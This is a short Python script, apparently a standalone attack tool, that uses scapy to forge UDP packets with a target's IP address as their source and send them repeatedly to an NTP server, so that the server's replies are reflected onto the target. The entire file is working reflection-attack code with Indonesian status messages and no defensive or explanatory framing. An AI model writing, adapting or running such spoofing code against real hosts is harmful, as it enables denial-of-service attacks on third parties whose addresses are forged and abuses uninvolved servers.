# s.py
import asyncio
from scapy.all import IP, UDP, Raw, send
from s_config import AMPLIFIER_IP, TARGET_IP, NTP_PORT, SPOOF_COUNT, DELAY_BETWEEN

# Payload: NTP request (mode 3: client)
ntp_payload = b'\x1b' + 47 * b'\x00'

async def send_spoof(i):
    pkt = IP(src=TARGET_IP, dst=AMPLIFIER_IP) / UDP(sport=123, dport=NTP_PORT) / Raw(load=ntp_payload)
    send(pkt, verbose=0)
    print(f"[{i+1}] Spoofed from {TARGET_IP} to {AMPLIFIER_IP}")

async def main():
    print(f"[*] Mulai spoofing {SPOOF_COUNT}x dari {TARGET_IP} ke {AMPLIFIER_IP}")
    for i in range(SPOOF_COUNT):
        await send_spoof(i)
        await asyncio.sleep(DELAY_BETWEEN)

if __name__ == "__main__":
    asyncio.run(main())
